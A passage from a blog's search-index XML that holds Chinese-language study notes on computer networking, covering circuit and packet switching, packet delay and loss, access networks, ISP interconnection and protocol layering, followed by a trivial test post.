switching）</strong>：</p><ul><li>通常被传统的电话网络使用，如固话；</li><li>在两个电话通讯之前，要建立一个物理线路（一个独享的线路），之后通过该线路两者才能通信。</li><li>此方式为独享，性能有保障。（独享能保障性能）</li><li>资源浪费；</li><li>不适合计算机之间的通讯,因为连接建立时间长，且计算机之间的通信有突发性，如果使用线路交换则浪费的片较多（即使这个呼叫没有数据传输，其所占据的片也不能够被别的呼叫使用），可靠性不高（“？”）。</li><li>将宽带分成片的方式（在线路交换中多路复用的方式）：<ul><li>1.频分(FDM，frequency-division multiplexing)；</li><li>2.时分(TDM,time-division multiplexing)：比如第一个时间片给第一个用户通信，第二个时间片给第二的用户通信，依次类推。</li><li>3.波分(WDM,wave-division multiplexing)：采用光通信的方式…；</li></ul></li></ul><p><strong>2.分组交换（packet switching）</strong>：</p><ul><li><p>以分组为单位，存储转发的方式来实现；</p></li><li><p>网络带宽资源不再分，传输时使用全部带宽；</p></li><li><p>主机之间传输的数据被分为一个个分组&#x2F;packet；</p></li><li><p>以分组&#x2F;packet为单位在每个交换节点以<u>存储</u>(要把整个分组存下来）转发的方式来进行；</p></li><li><p>延迟比线路交换长；</p></li><li><p>网络共享性（当主机的通信有很强的突发性时，分组交换有更好的共享性，自己不用时不占用网络资源。）</p><p>（注：发送和接受只是一个事物的两个方面，传播延时只要算一遍，从任一方面的角度来算即可）</p></li><li><p>可变长的排队延迟：若到达速率＞链路输出速率，则分组将会排队，等待传输；</p></li><li><p>可能出现的丢失：若路由器的缓存用完了，分组会被抛弃。</p></li><li><p>对多个分组时，分组交换划分时间片的方式是不固定的–&gt;<u>统计</u>多路复用（方式）；</p></li><li><p>分组交换支持的主机多些，按需使用。</p></li></ul><p><strong>网络核心的两个主要作用</strong>：转发和路由；</p><ul><li>转发是局部的，路由是全局的；</li><li>通过路由和转发的相互配合完成数据交换的过程；</li><li>通过查路由表决定一个分组往哪走，路由表是由路由器放在路由软件的路由模块算出来的；</li></ul><p><strong>分组交换按照网络层是否有连接分为两种方式：</strong></p><p><strong>1.数据报（datagram）：</strong></p><ul><li>无连接的；</li><li>每个分组携带了目标主机的完整地址，交换节点根据每个分组带的完整地址来存储转发；</li><li>两个主机在通讯前不用握手，不用建立连接，有数据就传输；</li><li>每个分组的传输是独立的（路径可能不一样，可能失序）；</li><li>无状态路由器，即路由器不维护主机与主机间通信的状态。</li></ul><p><strong>2.虚电路（virtual circuit)：</strong></p><ul><li>有连接的；</li><li>主机和目标主机通讯前要握手，为了在交换节点间保持通信的状态，（靠信令）建立起虚拟的线路，之后每个分组携带一个虚电路号，按虚电路号来标识，到每个交换节点存储转发。</li><li>虚电路的连接不仅仅体现在原主机与目标主机上，还体现在中间节点所经过的所有交易节点之上；</li><li>虚电路是在分组交换网络中建立的一条逻辑连接，和电路交换不同，它不需要独占物理线路，但数据传输前需要建立连接，传输结束后释放，是面向连接。<ul><li>面向连接的服务通常是指在数据传输前先建立连接；</li><li>回顾，tcp向应用进程提供服务时，是面向连接，该连接仅仅体现在端系统的tcp实体上，即仅仅体现在目标主机和原主机的tcp实体上，中间的路由器不维护它们之间的通信状态；</li></ul></li></ul><p><strong>小节</strong>：</p><p>补充：上行流量是你发送出去的数据，而下行流量是你接收到的数据</p><p>通信网络：</p><ul><li>1.电路交换网络：<ul><li>按划分pieces&#x2F;带宽的方式分为：FDM,    TDM，WDM.</li></ul></li><li>2.分组交换网络：<ul><li>数据报网络，虚电路网络</li></ul></li></ul><h3 id="分组延时、丢失和吞吐量"><a href="#分组延时、丢失和吞吐量" class="headerlink" title="分组延时、丢失和吞吐量"></a>分组延时、丢失和吞吐量</h3><p><strong>分组丢失</strong>：</p><ul><li>若分组到达路由器的缓冲区时，没有可用的缓冲区则该分组被丢失。</li><li>当分组（packet）到达路由器时，通常需要先在路由器的缓存中进行存储</li><li>4种分组延迟：<ul><li>排队延迟d(queue)：在输出链路上等待传输的时间；<br>依赖于路由器的拥塞程度；取决于流量强度；</li><li>节点处理延迟d(proc)：检查bit级差错，检查分组首部，查路由表，决定将分组导向何处。</li><li>传输延迟d(trans)：R链路带宽（bps），L分组长度（bits）；<br>将分组发送到链路上的时间为L&#x2F;R;<br>可以说是吐出第一个比特到打完该分组all比特的时间；</li><li>传播延迟d(prop)：d物理链路的长度，s在媒体上的传播速度，传播延迟为d&#x2F;s；<br>每个bit要越过那个链路消耗的时间。当两个节点距离比较近时可以忽略。</li></ul></li><li>在相邻两个节点中，一个节点到相邻一个节点之间可称为一个hop&#x2F;跳&#x2F;段，路径有很多hop构成。<br>像分组到达一个路由器后，由路由器决定哪个链路作为这个分组的下一跳。</li><li>节点延迟等于上面四种延迟的总和；</li></ul><p><strong>流量强度</strong>I&#x3D;La&#x2F;R，R该链路的带宽（bps），L每个分组的长度（bits），a分组到达队列的平均速度；<br>流量强度应取值在0-1之间。<br>当I比较小的时候，排队延迟小；当I趋近于1，排队延迟趋近于无限大。</p><p>对于<strong>丢失的分组，有三种可能：</strong><br>1.由上一个节点重传，若链路&#x2F;协议是可靠的<br>2.主机重传<br>3.若是使用utp来传输，则不重传。</p><p><strong>吞吐量</strong>：</p><ul><li>单位时间内，原主机向目标主机发出去的有效比特的数量。(在源端和目标端之间的传输速率)</li><li>分两种：<ul><li>瞬间吞吐量：在一个时间点的速率；</li><li>平均吞吐量：在一个长时间内的平均值。</li></ul></li><li>瓶颈链路：端到端路径上，限制端到端吞吐的链路。</li></ul><h2 id="4-接入网和物理媒体"><a href="#4-接入网和物理媒体" class="headerlink" title="4.接入网和物理媒体"></a>4.接入网和物理媒体</h2><p>接入重要的指标：带宽（看 b ps）、是否共享</p><p><strong>住宅接入：</strong></p><p>一：modem调制解调器，在音频载波信号上加载要传输的上网数据；</p><p>对于ISP（运营商）来说，利用之前已铺有的电话线，只需在原有的电话通信网络中让用户买个modem，俗称“猫”，即可上网，不用在另外铺线到每户了。（以前的这种方式打电话和上网不能同时进行，所以现在被淘汰了）<br>二： 后来，将4k HZ以下用于语言通讯，4k以上按找非对称方式，有段用于上行，有段用于下行，（用于下行的带宽更大些），该方式称为DSL，上行、下行数据采用调制与解调，用的带宽是4k HZ以上的额外带宽，这样在打电话的同时还可以上网（要装个DSL modem）。<br>三：有线公司提供的方式，运用原有的有线电视的线缆，通过有线电视公司进入互联网是用的共享带宽，使用cable splitter modem。<br>在家庭接入的方式中，使用不同的modem通过链路接入到 不同的运营商、有线公司的运营商等等。</p><p>现在也有用局域网的；</p><p><strong>企业接入网络：</strong></p><ul><li>通过交换机的级联or AP（无线接入点、无线路由器）进入到交换机的端口，再不断往上交换机的级联，最后通过机构的路由器接入到互联网。</li><li>它的出口不止一个，可以通过有线、无线的方式；</li><li>有两种通过无线的方式接入：<ul><li>1.无线局域网（WLAN），如WiFi，按带宽的不同分：100兆的为快速以太网，10G b ps的为万兆以太网（常用于数据机房）等等。</li><li>2.无线广域网（如一个基站能把十几公里内的移动手机都接入，再以高带宽的方式访问互联网）。</li></ul></li></ul><p>物理媒体：即物理链路，把两个节点连在一起的介质；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">分为两类：导引型媒体（看得见摸得着的），非导引型媒体；</span><br></pre></td></tr></table></figure><h2 id="5-互联网结构和ISP"><a href="#5-互联网结构和ISP" class="headerlink" title="5.互联网结构和ISP"></a>5.互联网结构和ISP</h2><p><strong>互联网划分方式</strong>：</p><ul><li>按节点和链路的类型来分：边缘系统、网络核心、接入网；</li><li>按照关系的远近来划分：互联网由一些ISP的网络通过网络互联设备构成而成。<ul><li>一个运营商的网络称为一个网络，构成一个子系统，称为一个ISP的网络，当然一个ISP里包括很多小的ISP<br>→把互联网称为Internet，网络的网络。    </li><li>任何的一个端系统都是通过ISP接入到互联网。</li></ul></li></ul><p>接入的<strong>ISP</strong>也要<strong>相互互联</strong>，如何互联<strong>分析</strong>：<br>1.不能全连接，即每两个ISPs直接相连，不可拓展，要O(N²)连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不可拓展：即拓展到一定规模，系统的性能下降会很快，需要连接的数量很多，代价大。</span><br></pre></td></tr></table></figure><p>2.有些ISP在全球范围内部署自己的路由器和链路，再把设备连在一起，把access net连在一起，这样一个access net到另一个access net就可借助于global ISP来完成数据的传输；<br>将每个接入ISP都连接到全局ISP，客户ISPs与提供者ISPs有经济合约（access net 通过经济合约与global ISP谈好）；<br>会有多个global ISP参与竞争，它们也互相合作，采用对等连接（peer link） or多个都接入到一个Internet exchange point（IXP，互联网交换点）来完成流量的交换。<br>业务细分，全球接入和区域接入。</p><p><strong>ICP互联网内容提供商</strong></p><ul><li><p>eg：百度、谷歌，</p></li><li><p>ICP是提供业务的，而ISP是提供网的。</p></li><li><p>ICP也要通过ISP接入到互联网，但因为ISP收费太高了，也不一定能让ICP的用户有好的体验，于是ICP可以在全球各个地方部署数据中心机房（DC，data center），通过自己部署的专用线缆or租用线缆等把DC连接在一起</p><ul><li>→减少自己的运营支出，向客户提供更好的服务。</li><li>DC常部署在离一些ISP数据中心比较进的地方（这样用户通过ISP接进来，则能很快能访问到ICP的DC，再返回去，用户体验好）</li></ul></li></ul><p><strong>ISP的连接方式：</strong></p><ul><li>pop：高层ISP接入底层ISP，涉及费用结算，eg：Tier 1 ISP接入regional ISP，regional ISP接入local ISP.</li><li>对等接入：2个ISP对等互接，不涉及费用结算。</li><li>IXP：多个对等ISP互联互通之处，通常不涉及费用结算。</li><li>ICP自己部署专用网络，同时也和各级ISP连接。</li></ul><p>（补充：<code>PoP就是在提供商网络中同一个地方的一组路由器（不少于1台），客户ISP就通过这组路由器与提供商ISP相连。</code>我们可以将它比作一个“接口”。原文：“A PoP is simply a group of one or more routers (at the same location) in the provider’s network where customer ISPs can connect into the provider ISP.</p><p>For a customer network to connect to a provider’s PoP, it can lease a high-speed link from a third-party telecommunications provider to directly connect one of its routers to a router at the PoP.”）</p><h2 id="6-协议层次和服务模型"><a href="#6-协议层次和服务模型" class="headerlink" title="6.协议层次和服务模型"></a>6.协议层次和服务模型</h2><p>计算机网络的功能是通过分层的方式来设计和实现。<br>分层：把较复杂的功能分为一个个模块，紧相邻的两个层的模块之间能调用与被调用，不允许or不推荐跨层的调用。<br>层次化解决复杂问题的好处：<br>        把大问题分解为若干个小问题，便于问题的解决；便于采用一些新技术；但效率较低。<br>层次化方式实现复杂网络功能:<br>       将网络复杂的功能分解为若干个功能明确的层次，每一层实现了其中一个或一组功能，功能中有其上层可以使用的功能被称为服务 。<br>对等层的实体通过协议来交换一些控制信息&#x2F;具体实现是通过采用协议实体的相互动作来实现。<br>本层通过承接的接口访问下层所提供的服务，交换pdu，最后通过承接的接口向上层提供更好的服务。<br>“服务”是功能的一部分&#x2F;子集，是外缘提供接口使用己提供的某些功能，是垂直的关系。<br>本层协议实体交互过程中应该遵守的规则的集合称为协议；协议的目的是为了向上层提供更好的服务；协议通过承接的接口访问下层所提供的服务来实现。协议是水平关系；<br>物理层无法借助其他的层次所提供的服务；<br>本层向上层提供的服务包括下面各层提供的服务，且还会提供些新功能。<br>服务用户：eg：有某些应用在tcp实体上跑，那么这些应用是服务用户，tcp是服务提供者。<br>服务访问点（SAP，services access point）：在承接的接口上，可用于下层服务提供者来区分不同的上层用户的，服务提供者在哪个地方向服务用户提供服务的地点。SAP有标志不同上层实体的作用。服务用户通过SAP告诉服务提供者想访问的服务；<br>服务提供者要通过原语来告诉服务用户我向你提供什么服务<br>原语（primitive)：提供服务的形式；</p><ul><li>应用进程使用传输层提供的服务要借助一系列socket api中的函数，这些函数可以抽象为原语，进行函数调用。</li><li>socket api是应用层使用传输层提供服务的一种形式，且是tcp ip协议族中的一种形式</li></ul><p><strong>服务的形式：</strong></p><ul><li><p>面向连接服务：两个通信进程在通信前要握手，此时采用的tcp所提供的服务为面向连接服务；例如tcp想应用进程提供的服务。。</p></li><li><p>无连接服务：两个通信进程在通信前不需建立连接or建立资源，不用握手，例如udp向应用进程提供的服务。</p><ul><li><p>服务：在相邻两层之间它的接口上，服务用户在SAP上使用原语使用下层向上层提供的服务。<br>一个协议实体可以同时为多个用户提供服务，需要SAP来区分。</p></li><li><p>对于原语，因为下层向上层提供的服务有各种各样的类型，且这些类型在使用过程中有一系列操作的序列，故需要原语的形式加以规范和区分。</p></li></ul></li></ul><p><strong>数据单元（DU）：</strong><br>IDU, interface data unit，ICI加SDU为IDU;<br>SDU, service data unit,服务数据单元，第n+1层（上层）要求第n层传出去的东西;<br>PDU, protocol data unit，协议数据单元，上层来的sdu加上 本层附加的控制信息在sdu头部 形成本层的PDU（若再往下交，则该PDU对于下层来说是sdu）;</p><ul><li>情况一：上述提及的，一对一。</li><li>情况二：若sdu非常大，下来后会分解成若干个小的，再各个加上该层头部形成pdu，一对多。</li><li>情况三：若sdu非常小，则下来后若干个sdu合在一起，再加上头部信息，形成pdu，多对一。</li></ul><p>ICI, interface control information，接口控制信息，用于便于sdu穿过接口;</p><p>pdu header：部分由ICI转过来，部分由本层附加上去</p><p>pdu body：来源于上层sdu</p><p><strong>在每一层，协议数据单元会有不同的称呼：</strong></p><ol><li>应用层，为应用报文，message；</li><li>传输层，为报文段，段，segment（全称：message segment），如tcp段、udp数据报；</li><li>网络层，为分组，packet；且若网络为无连接方式工作时，称为数据报，datagram；</li><li>链路层，为frame，帧；</li><li>物理层，可以叫位bit等等。</li></ol><p><strong>互联网（以tcp、IP协议为主的一些协议簇构成的网络）的层次</strong>：<br><strong>1.物理层</strong>：提供相邻两点之间的电磁波的承载，把链路层下来的比特交给对等的上层；<br>具体：在传送端，把上层交来的frame中的每个or一些的比特一组一组地变为物理信号，eg：电磁波信号，在介质中传送给对方；在接收端，把信号还原回原来的数据。<br><strong>2.链路层</strong>：会通过网卡，有链路连起来，（在物理层提供的功能基础之上）在相邻的两点之间传输以帧为单位的数据。常采用ppp、WiFi、Ethernet的协议<br>       <code>链路层和物理层一般都被封装在一张网卡上，链路层的协议和物理层的协议是配套的，</code><br><strong>3.网络层：</strong>（在链路层提供两点之间数据传输的基础上）传输以分组为单位的由原主机到目标主机的端到端的数据传输。最重要的两个功能：路由：找路；转发：从一个端口进向另一个端口出。IP协议（做转发），一系列的路由选择协议。<br><strong>4.传输层：</strong>（借助网络层主机到主机的传输服务）完成进程到进程的区分；把网络层提供的可能不可靠的通讯服务变为可靠的，即传输层tcp下面借助IP所提供的网络层的服务，tcp向上层应用进程提供可靠的服务，完成应用报文与应用报文之间的交互。主要协议是TCP,UTP.<br>**5.应用层：**应用进程在传输层提供的可靠的通讯服务基础之上实现各种网络应用。该层协议最多，常见如FTP,SMTP,HTTP,DNS。</p><p>OSI国际标准化组织，<br>OSI开放系统互连关于网络的参考模型：<br>1.应用层<br>2.表示层：允许应用解释传输的数据，如加密、压缩、机器相关的表示转换。<br>3.会话层：数据交换的同步、检查点、恢复<br>4.传输层<br>5.网络层<br>6.链路层<br>7.物理层</p><p>表示层、会话层在tcp、IP协议栈中由应用进程自己去做。<br>可以说，应用之间互相通信的过程为：在原端做一个大封装，在目标端做一个大的解封装，而中间的网络交换设备：到了交换机时则进行两层的解封装再封装，到了网络层的网络交换设备，即路由器时，要完成三层的解、封装</p><h1 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h1><p>1.应用层协议原理</p>]]></content>
      
      
      
        <tags>
            
            <tag> network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>test</title>
      <link href="/2025/07/10/test/"/>
      <url>/2025/07/10/test/</url>
      
        <content type="html"><![CDATA[<p>just  a test，</p><p>NOW is 2025&#x2F;7&#x2F;10 ，23:11;</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
